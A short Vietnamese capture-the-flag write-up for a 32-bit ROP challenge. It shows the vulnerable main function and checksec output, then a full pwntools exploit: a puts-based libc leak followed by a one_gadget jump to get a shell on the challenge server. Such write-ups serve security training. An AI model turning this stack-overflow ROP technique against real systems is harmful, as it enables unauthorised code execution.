# Challenge: Basic Rop X86

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/basic_ropx86/basic_rop_x86)
- Khi thực thi, chương trình cho nhập một input và output sau đó exit.
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[64]; // [esp+0h] [ebp-44h] BYREF

  memset(buf, 0, sizeof(buf));
  initialize();
  read(0, buf, 0x400u);
  write(1, buf, 0100u);
  return 0;
}
```
- Checksec:
```
+ Arch:       i386-32-little
+ RELRO:      Partial RELRO
+ Stack:      No canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x8046000)
+ RUNPATH:    b'.'
+ Stripped:   No
```

## Giải pháp và Quá trình
- Challenge đã từng giải qua rồi và chỉ khác ở chỗ file này 32-bit.
- Xem challenge trước [TẠI ĐÂY](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/basic_ropx64/README.md)

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('basic_rop_x86_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+56
        c
        b*main+24
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 14228)
else:
    p = process([exe.path])
GDB()

##########################
### STAGE 1: Leak libc ###
##########################
pop_edi = 0x0804868a
payload1 = flat(
    b'A'*0x48,
    pop_edi,
    exe.got['puts'],
    0,
    exe.plt['puts'],
    exe.sym['main'],
    exe.got['puts'],
    )
sl(payload1)
p.recv(0x40)
puts_leak = u32(p.recv(4))
libc.address = puts_leak - libc.sym['puts']
info("Puts leak: " + hex(puts_leak))
info("Libc address: " + hex(libc.address))

###########################
### STAGE 2: One gadget ###
###########################
one_gadget = 0xdd780
pop_ebp = 0x0804868b
payload2 = flat(
    b'A'*0x48,
    pop_ebp,
    0x804a0a0 + 0x48,
    libc.address + one_gadget,
    )
sl(payload2)

p.interactive()
```
